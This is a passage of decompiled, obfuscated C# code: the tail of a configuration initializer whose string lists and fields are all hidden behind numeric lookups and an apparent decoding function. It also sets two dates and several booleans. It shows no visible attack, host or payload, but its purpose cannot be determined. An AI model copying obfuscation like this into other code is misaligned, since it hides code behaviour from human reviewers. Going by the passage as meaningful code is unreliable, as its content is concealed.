			XpzNMVUBwHhS(getString_0(107381667)),
			XpzNMVUBwHhS(getString_0(107381634)),
			XpzNMVUBwHhS(getString_0(107381625)),
			XpzNMVUBwHhS(getString_0(107381072)),
			XpzNMVUBwHhS(getString_0(107381039)),
			XpzNMVUBwHhS(getString_0(107381006)),
			XpzNMVUBwHhS(getString_0(107380933)),
			XpzNMVUBwHhS(getString_0(107380924)),
			XpzNMVUBwHhS(getString_0(107380883))
		};
		WTUhRiZneOlt = new List<string>
		{
			XpzNMVUBwHhS(getString_0(107381322)),
			XpzNMVUBwHhS(getString_0(107381305)),
			XpzNMVUBwHhS(getString_0(107381212)),
			XpzNMVUBwHhS(getString_0(107381115)),
			XpzNMVUBwHhS(getString_0(107413246)),
			XpzNMVUBwHhS(getString_0(107413181)),
			XpzNMVUBwHhS(getString_0(107413568)),
			XpzNMVUBwHhS(getString_0(107413471)),
			XpzNMVUBwHhS(getString_0(107413378)),
			XpzNMVUBwHhS(getString_0(107412769)),
			XpzNMVUBwHhS(getString_0(107412676)),
			XpzNMVUBwHhS(getString_0(107412579)),
			XpzNMVUBwHhS(getString_0(107412998)),
			XpzNMVUBwHhS(getString_0(107381322))
		};
		ulUwCBHwSSyi = XpzNMVUBwHhS(getString_0(107412901));
		SiUCGwbiYZvKNq = new List<string>
		{
			XpzNMVUBwHhS(getString_0(107412308)),
			XpzNMVUBwHhS(getString_0(107412114)),
			XpzNMVUBwHhS(getString_0(107412432)),
			XpzNMVUBwHhS(getString_0(107411726)),
			XpzNMVUBwHhS(getString_0(107412012)),
			XpzNMVUBwHhS(getString_0(107411818))
		};
		KKtWmakpVhdA = new List<string>
		{
			XpzNMVUBwHhS(getString_0(107411112)),
			XpzNMVUBwHhS(getString_0(107411051)),
			XpzNMVUBwHhS(getString_0(107411534))
		};
		AoEfHeLwaPQ = getString_0(107396352);
		OwSmDzbxhbr = getString_0(107396352);
		tgwwssLUGYINdp = new DateTime(2000, 1, 1);
		epLbKNVGZbzsK = new DateTime(2100, 1, 1);
		VAaXrNEuZTj = getString_0(107396850);
		zSkjAkSdrNaEQ = getString_0(107411473);
		ldgzBVJjgOKZA = getString_0(107396352);
		iSaUXgFGhbBU = getString_0(107396352);
		KXBSfLUmHJ = getString_0(107396352);
		XeRdELiadDuurzB = getString_0(107396850);
		HWKxjANFxbm = getString_0(107396352);
		eCgqgJacXEtH = getString_0(107396352);
		hMmNJESmajNLVSI = new List<string>
		{
			getString_0(107396696),
			getString_0(107395898),
			getString_0(107396218),
			getString_0(107395747)
		};
		YsATJjivDuNMD = getString_0(107396352);
		DLyLpigOjpixLmug = getString_0(107411436);
		wLHCCOhfNgUdZ = getString_0(107396352);
		NJsxFWbcdxOk = getString_0(107396352);
		MFYtUtLPTmih = getString_0(107396352);
		MmCLhdrmXjijP = string.Empty;
		KBzEEwpcadk = getString_0(107396352);
		fNmnCeBtyRLy = getString_0(107396850);
		SubzSuIqJZsa = getString_0(107396352);
		uFuCHDmgpOnnL = getString_0(107394777);
		sZOSRFhRgSIn = getString_0(107394777);
		ErQaIKQkieIFY = getString_0(107396352);
		iyWwZOcQQVpELUp = getString_0(107396352);
		rXzetNuPLApv = getString_0(107396850);
		oGaVmSmuvgCw = getString_0(107396352);
		FmNZjVpwMZuqGJ = getString_0(107396352);
		LTkMlaDCpNiF = getString_0(107394951);
		IvlTKbPvYuys = getString_0(107396352);
		TLGMzrWjiAKxagb = getString_0(107396352);
		oWAGWCpnIrmUr = getString_0(107411431);
		SINcssXKqspnL = getString_0(107396352);
		FAAxKyrvepTlYX = getString_0(107396352);
		FmrgwwhfMbnasy = getString_0(107396352);
		zArXlyFCOP = getString_0(107396352);
		UvWHlEcOdCgiTx = getString_0(107411442);
		RcziZDHEplKwAMtJQ = getString_0(107396850);
		uFCeAgUGzeiOVT = getString_0(107396352);
		AYsvhSrYMBxXIJ = getString_0(107396352);
		yVgzNpNYZM = getString_0(107396352);
		VIPXLYpgVjF = new string[0];
		GvhFKpDNFWLzX = getString_0(107396352);
		VOjbVZMNEqmaD = true;
		yRmUjTdvkZqHGG = getString_0(107396352);
		rtwOYUfYif = false;
		ZLXxZaLrGVPm = true;
		FaIQeccuYFGcm = false;
		kdpmwXQYrgtQ = true;
	}
}
